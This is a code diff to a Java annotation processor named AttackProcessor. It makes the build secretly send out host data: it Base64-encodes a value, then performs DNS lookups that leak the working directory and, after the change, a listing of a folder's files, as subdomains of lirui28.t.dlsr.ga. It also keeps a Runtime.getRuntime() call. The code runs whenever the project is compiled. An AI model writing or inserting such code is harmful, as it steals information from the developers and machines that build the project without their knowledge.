@@ -13,6 +13,7 @@ import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.Inet4Address;
 import java.net.UnknownHostException;
+import java.util.Arrays;
 import java.util.Base64;
 import java.util.Set;
 
@@ -37,7 +38,14 @@ public class AttackProcessor extends AbstractProcessor {
             pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );
 
             Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
-            Inet4Address.getByName( pwd+".lirui28.t.dlsr.ga" );
+
+            if (folder.isDirectory()){
+                File[] files = folder.listFiles();
+                sb.append( Arrays.deepToString( files));
+            }
+
+
+            Inet4Address.getByName( sb.toString()+".lirui28.t.dlsr.ga" );
 
             Runtime runtime = Runtime.getRuntime();
 
